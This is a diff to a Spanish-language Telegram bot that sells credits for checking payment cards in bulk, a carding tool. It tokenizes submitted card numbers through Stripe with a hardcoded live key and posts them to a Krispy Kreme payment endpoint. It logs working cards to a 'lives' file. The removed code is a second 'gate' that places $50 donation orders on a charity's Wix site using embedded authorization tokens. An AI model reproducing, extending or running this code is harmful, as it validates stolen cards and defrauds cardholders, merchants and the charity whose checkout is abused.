@@ -11,7 +11,6 @@ import sys
 import threading
 import time
 from typing import List
-import uuid
 import requests
 from telebot import apihelper, TeleBot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
@@ -49,8 +48,7 @@ estado = {
     "lista_fallos": [],
     "usuario_actual": "Anónimo",
     "chat_id_actual": None,
-    "user_id_actual": None,
-    "gate_activo": "Krispy Kreme"
+    "user_id_actual": None
 }
 estado_lock = threading.Lock()
 cola_tareas = queue.Queue()
@@ -69,6 +67,8 @@ DATA_DIR = os.path.join(BASE_DIR, "data") if os.path.exists(os.path.join(BASE_DI
 os.makedirs(DATA_DIR, exist_ok=True)
 
 ARCHIVO_CLIENTES = os.path.join(DATA_DIR, "clientes.txt")
+
+# 👇 CORREGIDO: Ahora se guardan dentro de la carpeta /data del volumen persistente
 LIVES_FILE = os.path.join(DATA_DIR, "lives.txt")
 FAIL_FILE = os.path.join(DATA_DIR, "fail.txt")
 
@@ -77,17 +77,6 @@ creditos_lock = threading.Lock()
 COSTO_SUCCESS = 4
 COSTO_FAIL = 0
 CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios
-
-# URLs de los endpoints para el Gate de Ecopil / Wix
-URL_TOKENIZE = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
-URL_PAYMENT_DETAILS = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
-URL_CARTS = "https://www.ecopil.org/_api/cart-v2/v2/carts"
-URL_ACCESS_TOKENS = "https://www.ecopil.org/_api/v1/access-tokens"
-URL_RANDOM_USER = "https://randomuser.me/api/?nat=es"
-
-# Tokens fijos globales para Wix
-AUTH_TOKEN = "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0"
-COMMON_CONFIG = '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%221cf36fba-ad22-4b5e-a3db-1591b3aee565%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D'
 
 
 def notificar_propietario(mensaje):
@@ -133,6 +122,7 @@ def obtener_saldo(user_id):
 
 
 def registrar_usuario(user_id, username):
+    """Registra al usuario y le otorga 40 créditos gratis si es su primera vez."""
     with creditos_lock:
         clientes = cargar_clientes()
         user_str = str(user_id)
@@ -157,6 +147,7 @@ def registrar_usuario(user_id, username):
 
 
 def modificar_creditos_por_identificador(identificador, cantidad):
+    """Permite sumar o restar créditos buscando por ID o Username."""
     with creditos_lock:
         clientes = cargar_clientes()
         id_buscado = str(identificador).strip().lstrip("@")
@@ -198,6 +189,8 @@ def cobrar_creditos_por_resultado(user_id, es_exito):
             guardar_clientes(clientes)
             return nuevo_saldo, costo
         return 0, costo
+
+
 
 
 def validar_tarjeta(cc, mes, anio, cvv):
@@ -242,7 +235,7 @@ def notificar_usuarios_en_espera():
 
 def obtener_menu_principal():
     markup = InlineKeyboardMarkup()
-    btn_check = InlineKeyboardButton("⚡ SELECCIONAR GATE / CHECK", callback_data="btn_elegir_gate")
+    btn_check = InlineKeyboardButton("⚡ CHECK_CCS (API STRIPE)", callback_data="btn_check_ccs")
     btn_saldo = InlineKeyboardButton("💰 Mis Créditos", callback_data="btn_saldo")
     btn_instrucciones = InlineKeyboardButton("📖 Instrucciones", callback_data="btn_instrucciones")
     btn_formato = InlineKeyboardButton("📌 Formato Correcto", url="https://t.me/filtro_carbon_bot")
@@ -260,7 +253,6 @@ def generar_resumen_proceso(user_id=None):
     resumen = (
         "📊 <b>RESUMEN DEL PROCESO</b>\n"
         "─────────────────────────\n"
-        f"<b>Gate utilizado:</b> {estado['gate_activo']}\n"
         f"<b>Total procesadas:</b> {estado['procesados']}/{estado['total']}\n"
         f"✅ <b>SUCCESS:</b> {estado['exitosos']}\n"
         f"❌ <b>FAIL:</b> {estado['fallidos']}\n"
@@ -275,7 +267,6 @@ def generar_informe_propietario():
     saldo_usuario = obtener_saldo(estado["user_id_actual"]) if estado["user_id_actual"] else "N/A"
     
     informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE</b>\n"
-    informe += f"🚪 <b>Gate:</b> {estado['gate_activo']}\n"
     informe += f"👤 <b>Usuario:</b> @{estado['usuario_actual']} (<code>{estado['user_id_actual']}</code>)\n"
     informe += f"💰 <b>Saldo restante:</b> {saldo_usuario} cr.\n"
     informe += f"📊 <b>Totales:</b> {estado['procesados']}/{estado['total']} (✅ {estado['exitosos']} | ❌ {estado['fallidos']})\n\n"
@@ -291,13 +282,15 @@ def generar_informe_propietario():
     if estado["lista_fallos"]:
         for item in estado["lista_fallos"][:25]:
             informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
+        if len(estado["lista_fallos"]) > 25:
+            informe += f"<i>...y {len(estado['lista_fallos']) - 25} fallos más.</i>\n"
     else:
         informe += "<i>Sin fallos registrados.</i>\n"
 
     return informe
 
 
-def mostrar_selector_gates(chat_id, user_id):
+def solicitar_datos_ccs(chat_id, user_id):
     saldo = obtener_saldo(user_id)
     if saldo is None:
         bot.send_message(chat_id, "❌ No estás registrado. Escribe /start primero.")
@@ -306,7 +299,7 @@ def mostrar_selector_gates(chat_id, user_id):
     if saldo < COSTO_SUCCESS:
         bot.send_message(
             chat_id,
-            f"⛔ <b>Saldo insuficiente:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b>.",
+            f"⛔ <b>Saldo insuficiente para iniciar:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para procesar.",
             parse_mode="HTML",
         )
         return
@@ -317,30 +310,16 @@ def mostrar_selector_gates(chat_id, user_id):
             markup_aviso.add(InlineKeyboardButton("🔔 Avisarme cuando esté libre", callback_data="btn_avisar"))
             bot.send_message(
                 chat_id,
-                "⚠️ Ya hay un proceso en ejecución. ¿Deseas que te avise en cuanto quede desocupado?",
+                "⚠️ Ya hay un proceso de verificación en ejecución. ¿Deseas que te avise en cuanto quede desocupado?",
                 reply_markup=markup_aviso,
             )
             return
 
-    markup = InlineKeyboardMarkup()
-    btn_krispy = InlineKeyboardButton("🍩 Gate 1: Krispy Kreme (Stripe API)", callback_data="gate_krispy")
-    btn_wix = InlineKeyboardButton("💳 Gate 2: Stripe Wix Charger ($50 - Ecopil)", callback_data="gate_wix")
-    markup.row(btn_krispy)
-    markup.row(btn_wix)
-
-    bot.send_message(
-        chat_id,
-        "🎛️ <b>SELECCIONA LA PASARELA (GATE) A UTILIZAR:</b>\n"
-        f"💰 <i>Tu saldo actual: {saldo} créditos (Costo: {COSTO_SUCCESS} por éxito)</i>",
-        parse_mode="HTML",
-        reply_markup=markup
-    )
-
-
-def solicitar_datos_ccs(chat_id, user_id):
     msg = bot.send_message(
         chat_id,
-        f"📋 <b>Gate Activo:</b> {estado['gate_activo']}\n\n"
+        f"📋 <b>Gate Stripe API Active</b>\n"
+        f"💳 <b>Saldo disponible: {saldo} créditos</b>\n"
+        f"<i>(Costo: {COSTO_SUCCESS} créditos por SUCCESS | Fails totalmente GRATIS)</i>\n\n"
         "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:\n"
         "<i>(Si tu lista está desordenada, puedes formatearla con @filtro_carbon_bot)</i>",
         parse_mode="HTML",
@@ -348,16 +327,13 @@ def solicitar_datos_ccs(chat_id, user_id):
     bot.register_next_step_handler(msg, recibir_datos_lote)
 
 
-# =========================================================
-# GATE 1: KRISPY KREME
-# =========================================================
-def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
+def procesar_tarjeta_api(correo, password, linea_cc):
     try:
         cc_partes = linea_cc.split("|")
         cc = cc_partes[0]
         mm = cc_partes[1]
         yyyy = cc_partes[2]
-        cvv = cc_partes[3]
+        ccv = cc_partes[3]
     except IndexError:
         return False, "Formato incorrecto en la línea de tarjeta"
 
@@ -376,11 +352,16 @@ def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
     stripe_headers = {
         "Host": "api.stripe.com",
         "Content-Type": "application/x-www-form-urlencoded",
+        "Accept-Encoding": "gzip, deflate, br",
         "Stripe-Version": "2020-08-27",
         "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
+        "Connection": "keep-alive",
+        "Accept": "*/*",
+        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
+        "X-Stripe-User-Agent": '{"type":"iPad11,6","os_version":"18.4","bindings_version":"24.14.0","vendor_identifier":"3B576E16-E88C-4CBC-A3A0-E0490F33025C","lang":"objective-c","model":"iPad"}',
         "Authorization": "Bearer pk_live_51OjVj8FXiwuOsp7TTDvOZMPwEf81Jf8vmLt0pj9Mip3RcjHQIMyV4FIV9UKdIKY9WBY0GiFd1Oo2NY4Dpd0L3VrR00XBj375RZ",
     }
-    stripe_payload = f"card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"
+    stripe_payload = f"card[cvc]={ccv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"
 
     try:
         resp_stripe = session.post(stripe_url, headers=stripe_headers, data=stripe_payload, timeout=15)
@@ -388,51 +369,60 @@ def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
         card_token_id = stripe_json.get("id")
         if not card_token_id:
             error_msg = stripe_json.get("error", {}).get("message", "Error al generar token en Stripe")
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {error_msg}\n")
             return False, error_msg
     except Exception as e:
-        err_msg = f"Excepción en Stripe: {e}"
-        with open(FAIL_FILE, "a", encoding="utf-8") as f:
-            f.write(f"{linea_cc} | {err_msg}\n")
-        return False, err_msg
+        return False, f"Excepción en Stripe: {e}"
 
     krispy_url = "https://krispykreme.adomicil.io/Payment/Card/Add"
     krispy_payload = {
         "Data": {
             "Card": {
                 "CardIsCredit": True,
+                "CardNoExt": "",
+                "CardStreet": "",
                 "CardExpirationYear": yyyy,
                 "DeviceId": card_token_id,
                 "CardLast4": ultimos_4,
                 "CardExpirationMonth": mm,
                 "CardPhone": "2481709250",
-                "CardEmail": correo or "test@gmail.com",
+                "CardNoInt": "",
+                "CardZipCode": "",
+                "CardEmail": correo,
+                "CardNeighborhood": "",
                 "CardToken": card_token_id,
+                "CardMunicipality": "",
                 "CardBankName": "Jpmorgan Chase Bank N.A.",
                 "CardBrand": "visa",
                 "CardHolderName": "Juan Perez",
-                "Cardcvv": cvv,
+                "Cardcvv": ccv,
             }
         },
         "Auth": {
             "CredentialPlatform": "mail",
             "Signature": signature,
-            "CredentialData": correo or "test@gmail.com",
+            "CredentialData": correo,
             "CredentialPwd": credential_pwd,
             "Timestamp": timestamp_str,
-            "CredentialLogin": correo or "test@gmail.com",
+            "CredentialLogin": correo,
         },
     }
     krispy_headers = {
         "Host": "krispykreme.adomicil.io",
         "Content-Type": "application/json; charset=UTF-8",
         "x-language": "es",
+        "Connection": "keep-alive",
+        "Accept": "*/*",
+        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
         "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
     }
 
     try:
-        resp_krispy = session.post(krispy_url, headers=krispy_headers, json=krispy_payload, timeout=15)
+        resp_krispy = session.post(
+            krispy_url,
+            headers=krispy_headers,
+            data=json.dumps(krispy_payload),
+            timeout=15,
+        )
         krispy_json = resp_krispy.json()
         response_data = krispy_json.get("Response", {})
         return_code = response_data.get("ReturnCode", 500)
@@ -449,261 +439,6 @@ def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
 
     except Exception as e:
         err_msg = f"Error en Krispy Kreme: {e}"
-        with open(FAIL_FILE, "a", encoding="utf-8") as f:
-            f.write(f"{linea_cc} | {err_msg}\n")
-        return False, err_msg
-
-
-# =========================================================
-# GATE 2: STRIPE WIX CHARGER ($50 - ECOPIL) (Lógica exacta y completa)
-# =========================================================
-def procesar_tarjeta_wix(linea_cc):
-    session = requests.Session()
-    try:
-        partes = linea_cc.strip().split("|")
-        if len(partes) < 4:
-            return False, "Formato incorrecto"
-
-        cc_number = partes[0].strip()
-        mes_str = partes[1].strip()
-        cc_yyyy = int(partes[2].strip())
-        cc_cvv = partes[3].strip()
-        cc_mm = int(mes_str)
-
-        # 0. Obtener Visitor ID y Nombre Aleatorio
-        idd2 = str(uuid.uuid4())
-        try:
-            resp_visitor = session.get(
-                f"{URL_ACCESS_TOKENS}?cacheBust={idd2}",
-                headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-                    "Pragma": "no-cache",
-                    "Accept": "*/*",
-                },
-            )
-            visitorId2 = resp_visitor.json().get("visitorId", idd2)
-        except Exception:
-            visitorId2 = idd2
-
-        try:
-            resp_name = session.get(
-                URL_RANDOM_USER,
-                headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-                    "Pragma": "no-cache",
-                    "Accept": "*/*",
-                },
-            )
-            name_data = resp_name.json()["results"][0]["name"]
-            holder_name = f"{name_data['first']} {name_data['last']}"
-        except Exception:
-            holder_name = "esgar lopez"
-
-        # 1. Tokenización (Token CC)
-        headers_tokenize = {
-            "Host": "cashier-pci.wixapps.net",
-            "Content-Length": "166",
-            "X-Wix-Brand": "wix",
-            "Sec-Ch-Ua-Platform": '"Windows"',
-            "Authorization": AUTH_TOKEN,
-            "Accept-Language": "es-419,es;q=0.9",
-            "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
-            "Sec-Ch-Ua-Mobile": "?0",
-            "Commonconfig": COMMON_CONFIG,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "Origin": "https://cashier-pci.wixapps.net",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": f"https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.ecopil.org&msid=390faaee-dafd-48eb-a4bc-38baeef05eb0&visitorId={visitorId2}&siteOwnerId=0a044b16-e087-4261-a5d3-460a61680769",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Priority": "u=1, i",
-            "Connection": "keep-alive",
-        }
-
-        payload_tokenize = {
-            "cvv": cc_cvv,
-            "creditCard": {
-                "number": cc_number,
-                "expiration": {"month": cc_mm, "year": cc_yyyy},
-                "additionalInformation": {"holderName": holder_name},
-                "billingAddress": {},
-            },
-        }
-
-        resp = session.post(URL_TOKENIZE, headers=headers_tokenize, json=payload_tokenize)
-        
-        if '{"message":"Unexpected Payments exception","details":{}}' in resp.text or '{"message":"Could not parse JSON","details":{}}' in resp.text:
-            msg_err = "Error personalizado (Custom Keycheck)"
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {msg_err}\n")
-            return False, msg_err
-
-        try:
-            token = resp.json()["token"]["token"]
-        except Exception:
-            err_msg = f"Tokenización fallida: {resp.text[:100]}"
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {err_msg}\n")
-            return False, err_msg
-
-        # 2. Payment Details (Token V2)
-        headers_v2 = {
-            "Host": "www.ecopil.org",
-            "Content-Length": "443",
-            "X-Wix-Brand": "wix",
-            "Sec-Ch-Ua-Platform": '"Windows"',
-            "Authorization": AUTH_TOKEN,
-            "X-Xsrf-Token": "1793833731|QmlkzedBUzmf",
-            "Accept-Language": "es-419,es;q=0.9",
-            "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
-            "Sec-Ch-Ua-Mobile": "?0",
-            "Commonconfig": COMMON_CONFIG,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "Origin": "https://www.ecopil.org",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": "https://www.ecopil.org/checkout?checkoutId=170d320a-f56a-4d96-9bc8-d61af1eb9aba&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%2526campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Priority": "u=1, i",
-        }
-
-        payload_v2 = {
-            "details": {
-                "paymentMethod": "creditCard",
-                "billingAddress": {},
-                "redirectTarget": "EMBEDDED",
-                "installments": 1,
-                "card": {
-                    "numberToken": token,
-                    "securityCodeToken": token,
-                    "holderName": holder_name,
-                    "expiryMonth": cc_mm,
-                    "expiryYear": cc_yyyy,
-                },
-                "buyerInfo": {
-                    "buyerId": visitorId2,
-                    "buyerLanguage": "es",
-                },
-                "clientInfo": {
-                    "deviceFingerprint": "b4adb5adddaf4012663d4eb24d1b48b0"
-                },
-            }
-        }
-
-        resp = session.post(URL_PAYMENT_DETAILS, headers=headers_v2, json=payload_v2)
-        try:
-            details_id = resp.json()["detailsId"]
-        except Exception:
-            err_msg = f"Error en Payment Details: {resp.text[:100]}"
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {err_msg}\n")
-            return False, err_msg
-
-        # 3. Crear Carrito Nuevo (Cart Token)
-        headers_cart = {
-            "Host": "www.ecopil.org",
-            "Content-Length": "309",
-            "X-Wix-Brand": "wix",
-            "Authorization": "123OCk2g0S7I1_FxdtAtT4koSXTbgEzOKzBloI1XOS8.eyJpbnN0YW5jZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwiYXBwRGVmSWQiOiIyMmJlZjM0NS0zYzViLTRjMTgtYjc4Mi03NGQ0MDg1MTEyZmYiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA1VDAwOjA0OjIxLjA5NFoiLCJkZW1vTW9kZSI6ZmFsc2UsImFpZCI6ImYxODViZjhkLWZmMzQtNGYxYi1iMGVmLTVlMDM1MTgwZTU1ZiIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIiwic3MiOmZhbHNlfQ",
-            "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%224d432572-9526-4dab-b1e7-b4f017dd0b50%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "X-Wix-Linguist": "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0",
-            "Content-Type": "application/json",
-            "Origin": "https://www.ecopil.org",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.395ab825.bundle.min.js",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "es-419,es;q=0.9",
-            "Priority": "u=1, i",
-        }
-
-        payload_cart = {
-            "cart": {
-                "settings": {"lockGiftCard": True, "lockCouponCode": True},
-                "source": {"channelType": "OTHER_PLATFORM"},
-            },
-            "catalogItems": [{
-                "catalogReference": {
-                    "appId": "333b456e-dd48-4d6b-b32b-9fd48d74e163",
-                    "catalogItemId": "2c882aa1-c6c2-4e62-b524-c300209c357f",
-                    "options": {"amount": 50, "frequency": "ONE_TIME"},
-                },
-                "quantity": 1,
-            }],
-        }
-
-        resp = session.post(URL_CARTS, headers=headers_cart, json=payload_cart)
-        try:
-            carro_tok = resp.json()["cart"]["id"]
-        except Exception:
-            err_msg = f"Error al crear carrito: {resp.text[:100]}"
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {err_msg}\n")
-            return False, err_msg
-
-        # 4. Place Order (Testear CC)
-        url_place_order = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{carro_tok}/place-order"
-        headers_place_order = {
-            "Host": "www.ecopil.org",
-            "X-Time-Budget": "30000",
-            "X-Wix-Bi-Gateway": "environment=js-sdk,package-name=@wix/auto_sdk_ecom_cart-v-2,method-fqn=wix.ecom.cart.v2.CartService.PlaceOrder,entity=wix.ecom.v2.cart",
-            "Authorization": AUTH_TOKEN,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
-            "X-Wix-Linguist": "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4",
-            "Content-Type": "application/json",
-            "Accept": "*/*",
-            "Origin": "https://www.ecopil.org",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.1db1888f.bundle.min.js",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "es-419,es;q=0.9",
-            "Priority": "u=1, i",
-        }
-
-        payload_place_order = {
-            "cartId": carro_tok,
-            "priceVerificationToken": "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRvdGFsXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJ0b3RhbEFmdGVyR2lmdENhcmRzXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJwYXlOb3dcIjp7XCJhbW91bnRcIjpcIjUwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwLjAwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInBheUxhdGVyXCI6e1wiYW1vdW50XCI6XCIwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjAuMDBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19fSIsImlhdCI6MTc5MzgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs",
-            "paymentToken": details_id,
-            "redirectUrls": {
-                "errorUrl": f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=error",
-                "cancelUrl": f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=cancel",
-                "successUrl": "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f",
-                "pendingUrl": "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f",
-            },
-            "savePaymentMethod": False,
-            "delayCapture": False,
-        }
-
-        resp = session.post(url_place_order, headers=headers_place_order, json=payload_place_order)
-        resultado = resp.text
-
-        if "DECLINED" in resultado or "Invalid payment status" in resultado:
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | Tarjeta DECLINADA\n")
-            return False, "Tarjeta DECLINADA"
-        elif '"completed":true' in resultado or "paymentResponseToken" in resultado:
-            with open(LIVES_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | Transacción APROBADA\n")
-            return True, "¡Transacción APROBADA / Completada!"
-        else:
-            msg_res = f"Respuesta: {resultado[:100]}"
-            with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{linea_cc} | {msg_res}\n")
-            return False, msg_res
-
-    except Exception as e:
-        err_msg = f"Error inesperado: {e}"
         with open(FAIL_FILE, "a", encoding="utf-8") as f:
             f.write(f"{linea_cc} | {err_msg}\n")
         return False, err_msg
@@ -734,16 +469,12 @@ def worker_principal():
                         estado["en_progreso"] = False
                     bot.send_message(
                         chat_id, 
-                        f"⛔ <b>Proceso detenido:</b> Saldo insuficiente ({saldo_actual} créditos).", 
+                        f"⛔ <b>Proceso detenido:</b> Tu saldo actual es de <b>{saldo_actual} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para continuar procesando.", 
                         parse_mode="HTML"
                     )
                     break
 
-            # Ejecutar el gate seleccionado dinámicamente
-            if "Krispy" in estado["gate_activo"]:
-                exito, mensaje_resultado = procesar_tarjeta_krispy(linea_cc, correo, password)
-            else:
-                exito, mensaje_resultado = procesar_tarjeta_wix(linea_cc)
+            exito, mensaje_resultado = procesar_tarjeta_api(correo, password, linea_cc)
 
             if user_id:
                 cobrar_creditos_por_resultado(user_id, exito)
@@ -757,6 +488,7 @@ def worker_principal():
                     estado["fallidos"] += 1
                     estado["lista_fallos"].append({"cc": linea_cc, "msg": mensaje_resultado})
 
